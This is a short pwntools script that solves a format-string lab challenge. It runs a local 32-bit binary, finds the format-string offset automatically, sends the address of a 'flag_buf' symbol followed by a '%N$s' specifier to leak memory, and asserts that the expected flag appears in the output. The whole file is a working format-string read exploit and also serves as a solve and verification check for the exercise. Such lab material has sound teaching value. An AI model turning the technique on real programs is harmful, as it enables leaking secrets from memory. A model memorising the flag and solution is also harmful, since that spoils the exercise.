#!/usr/bin/env python3
from pathlib import Path

from pwn import ELF, FmtStr, context, p32, process

HERE = Path(__file__).resolve().parent
BINARY = HERE / "01"
EXPECTED = b"KSJ{FSB_READ_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
context.log_level = "error"


def execute_fmt(payload: bytes) -> bytes:
    tube = process([str(BINARY)], cwd=str(HERE))
    tube.recvuntil(b"Input: ")
    tube.send(payload)
    return tube.recvall(timeout=2)


offset = FmtStr(execute_fmt).offset
tube = process([str(BINARY)], cwd=str(HERE))
tube.recvuntil(b"Input: ")
tube.send(p32(elf.sym["flag_buf"]) + f"%{offset}$s".encode())
output = tube.recvall(timeout=2)
assert EXPECTED in output, output
print(f"[PASS] 01/fsb32_read: offset={offset}, flag_buf={elf.sym['flag_buf']:#x}")
